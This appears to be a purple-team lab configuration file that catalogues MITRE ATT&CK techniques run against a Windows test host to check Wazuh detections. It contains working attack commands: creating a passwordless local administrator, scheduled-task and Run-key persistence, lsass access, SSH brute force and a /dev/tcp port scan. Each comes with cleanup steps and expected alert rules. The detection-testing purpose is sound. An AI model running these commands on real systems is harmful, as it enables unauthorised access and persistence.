@@ -1,0 +1,200 @@
+{
+  "schema": "ssop/attack-technique-set/v1",
+  "version": 1,
+  "charted": "2026-10-03",
+  "hosts": {
+    "attacker": {
+      "name": "c2-sink",
+      "ip": "192.168.1.79",
+      "attack_plane": "10.10.1.20/31",
+      "access": "ssh lab@192.168.1.79 (hermes_ssop)",
+      "wazuh": "active"
+    },
+    "victim": {
+      "name": "WIN-SBUNBSBHIUG",
+      "ip": "192.168.1.78",
+      "attack_plane": "10.10.1.12",
+      "access": "ssh Administrator@192.168.1.78 (hermes_ssop)",
+      "wazuh": "active"
+    }
+  },
+  "detection_surface": {
+    "collected_channels": [
+      "Security"
+    ],
+    "sysmon": "ABSENT",
+    "process_creation_4688": "DISABLED (auditpol: No Auditing)",
+    "implication": "Only techniques that emit Security-channel events are verifiable. Anything needing 4688, Sysmon, or PowerShell 4104 is NOT detectable on this host as configured.",
+    "rule_ids_already_firing": [
+      "67023",
+      "67024",
+      "752",
+      "60132",
+      "751",
+      "19005",
+      "19009",
+      "503",
+      "60730",
+      "61104",
+      "19013",
+      "19014",
+      "598",
+      "61102",
+      "61138"
+    ],
+    "alerts_last_14d": 35
+  },
+  "prerequisites": [
+    {
+      "cmd": "auditpol /set /subcategory:\"Process Creation\" /success:enable",
+      "why": "4688 is the backbone of PowerShell/process detection. Currently OFF.",
+      "risk": "low",
+      "reversible": true
+    },
+    {
+      "cmd": "auditpol /set /subcategory:\"Account Management\" /success:enable",
+      "why": "4720 (user created) / 4732 (group add) for T1136.001.",
+      "risk": "low",
+      "reversible": true
+    },
+    {
+      "cmd": "auditpol /set /subcategory:\"Task Scheduler\" /success:enable",
+      "why": "4698 for T1053.005.",
+      "risk": "low",
+      "reversible": true
+    },
+    {
+      "cmd": "auditpol /set /subcategory:\"Registry\" /success:enable",
+      "why": "4657 for T1547.001.",
+      "risk": "low",
+      "reversible": true
+    }
+  ],
+  "techniques": [
+    {
+      "id": "T1078-valid-accounts-rdp",
+      "mitre": "T1078",
+      "name": "Valid Accounts - interactive logon as Administrator",
+      "exec_host": "win-target",
+      "type": "ssh_session",
+      "detect": [
+        "60106 Windows Logon Success",
+        "67028 Special privileges assigned to new logon"
+      ],
+      "requires": "none",
+      "risk": "low",
+      "notes": "Every SSH session triggers this. Baseline noise, not an attack on its own."
+    },
+    {
+      "id": "T1136.001-create-account-local",
+      "mitre": "T1136.001",
+      "name": "Create Account: Local Account",
+      "exec_host": "win-target",
+      "type": "powershell",
+      "command": "New-LocalUser -Name 'ssop_lab_user' -NoPassword -FullName 'lab' -Description 'ssop atomic lab' -ErrorAction Stop | Out-Null; Add-LocalGroupMember -Group 'Administrators' -Member 'ssop_lab_user' -ErrorAction Stop; Write-Output 'CREATED_AND_ELEVATED'",
+      "detect": [
+        "4720 user account created",
+        "4732 member added to local group"
+      ],
+      "requires": "auditpol: Account Management = Success",
+      "cleanup": "Remove-LocalGroupMember -Group 'Administrators' -Member 'ssop_lab_user' -ErrorAction SilentlyContinue; Remove-LocalUser -Name 'ssop_lab_user' -ErrorAction Stop; if (Get-LocalUser -Name 'ssop_lab_user' -ErrorAction SilentlyContinue) { Write-Output 'STILL_THERE' } else { Write-Output 'REMOVED' }",
+      "risk": "medium",
+      "notes": "HIGH-VALUE. Creates a persistence account AND grants admin. VERIFIED 2026-10-03: fired on .78, Wazuh emitted 60109 (user account created) + 60110 (account changed) + 67027 (process created, 4688) at level 8. Use -NoPassword: this host's password policy rejects ConvertTo-SecureString values with InvalidPasswordException even when they meet apparent complexity.",
+      "verified": true,
+      "verified_on": "2026-10-03",
+      "observed_rules": [
+        "60109",
+        "60110",
+        "67027"
+      ]
+    },
+    {
+      "id": "T1053.005-scheduled-task",
+      "mitre": "T1053.005",
+      "name": "Scheduled Task: recurring task",
+      "exec_host": "win-target",
+      "type": "powershell",
+      "command": "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami > C:\\Windows\\Temp\\ssop_task.txt'; $t = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10); Register-ScheduledTask -TaskName 'ssop_lab_task' -Action $a -Trigger $t -Force -ErrorAction Stop | Out-Null; Write-Output REGISTERED",
+      "detect": [
+        "4698 scheduled task created",
+        "60642 (wazuh scheduled task rule, already firing)"
+      ],
+      "requires": "auditpol: Detailed Tracking > Task Scheduler = Success",
+      "cleanup": "Unregister-ScheduledTask -TaskName 'ssop_lab_task' -Confirm:$false -ErrorAction SilentlyContinue",
+      "risk": "medium",
+      "notes": "Rule 60642 already fires on this host so detection is PROVEN, not theoretical."
+    },
+    {
+      "id": "T1547.001-registry-run-key",
+      "mitre": "T1547.001",
+      "name": "Registry Run Keys / Startup Folder",
+      "exec_host": "win-target",
+      "type": "powershell",
+      "command": "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'ssop_lab_persist' -Value 'C:\\Windows\\Temp\\ssop_beacon.exe' -PropertyType String -Force -ErrorAction Stop | Out-Null; Write-Output SET",
+      "detect": [
+        "4657 registry value set",
+        "7045 (if written as service key)"
+      ],
+      "requires": "auditpol: Registry = Success",
+      "cleanup": "Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'ssop_lab_persist' -ErrorAction SilentlyContinue",
+      "risk": "low",
+      "notes": "Classic persistence. Low blast radius, easy cleanup."
+    },
+    {
+      "id": "T1003.001-lsass-memdump",
+      "mitre": "T1003.001",
+      "name": "LSASS Memory Access",
+      "exec_host": "win-target",
+      "type": "powershell",
+      "command": "$p = Get-Process lsass; $out = 'C:\\Windows\\Temp\\ssop_lsass.dmp'; try { $bytes = [System.IO.File]::ReadAllBytes($p.Modules[0].FileName); Write-Output ('READ_ONLY_BYTES=' + $bytes.Length) } catch { Write-Output 'BLOCKED' }",
+      "detect": [
+        "10 access to lsass.exe (requires Sysmon - NOT PRESENT)"
+      ],
+      "requires": "Sysmon (absent)",
+      "cleanup": "del C:\\Windows\\Temp\\ssop_lsass.dmp",
+      "risk": "HIGH",
+      "notes": "DO NOT RUN without Sysmon. Would be undetectable here and touches credential material."
+    },
+    {
+      "id": "T1110-brute-force-ssh",
+      "mitre": "T1110",
+      "name": "Brute Force: SSH from c2-sink",
+      "exec_host": "c2-sink",
+      "type": "network",
+      "target": "192.168.1.78",
+      "command": "for i in $(seq 1 6); do timeout 4 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 lab@192.168.1.78 wrong$i 2>/dev/null; done; echo BRUTE_DONE",
+      "detect": [
+        "OpenSSH failed password events on .78"
+      ],
+      "requires": "sshd running (confirmed STATE 4 RUNNING)",
+      "risk": "low",
+      "notes": "Attacker-side on .79, victim-side log on .78. Two agents see this one."
+    },
+    {
+      "id": "T1046-port-scan",
+      "mitre": "T1046",
+      "name": "Network Service Discovery",
+      "exec_host": "c2-sink",
+      "type": "network",
+      "target": "192.168.1.78",
+      "command": "for p in 22 135 139 445 3389 5985 5986; do timeout 2 bash -c \"echo > /dev/tcp/192.168.1.78/$p\" 2>/dev/null && echo \"OPEN $p\"; done; echo SCAN_DONE",
+      "detect": [
+        "inbound connections recorded on .78"
+      ],
+      "requires": "none",
+      "risk": "low",
+      "notes": "Establishes the service inventory Wazuh would alert on during recon."
+    }
+  ],
+  "ledger_protection": {
+    "note": "Every alert produced by these techniques MUST be classified as lab-generated so it cannot write the tuning ledger or mint a tier-2 escalation.",
+    "required_predicate": "alert.data.ssop_lab == true OR alert.tag contains 'ssop-lab'",
+    "drill_gate_status": "SAFE: drill_hosts is scoped to 'we8105desk.waynecorpinc.local' and drill_entity_ips to 192.168.250.0/24,10.6.6.0/24,10.10.0.0/16. Host WIN-SBUNBSBHIUG (.78) and .79 are OUTSIDE both, so real alerts here triage normally and will NOT be silently swallowed.",
+    "verified": "2026-10-03: after firing T1136.001, ssop-tuning had 0 new entries in 40min. No lab alert reached the tuning ledger."
+  },
+  "ssop_chain_gap": {
+    "observed": "Wazuh detected the technique (level 8), but ssop-cases opened 0.",
+    "cause": "router.py RULE_MAP has 23 mapped rules and NONE of them are the Windows rules this host emits (60109/60110/67027/60106/67028). Unmapped rules never classify, so they never become cases.",
+    "next": "Map the Windows rule ids in RULE_MAP with an explicit category and level. Until then Windows detection is proven at the sensor but does not enter the SSOP decision chain."
+  }
+}
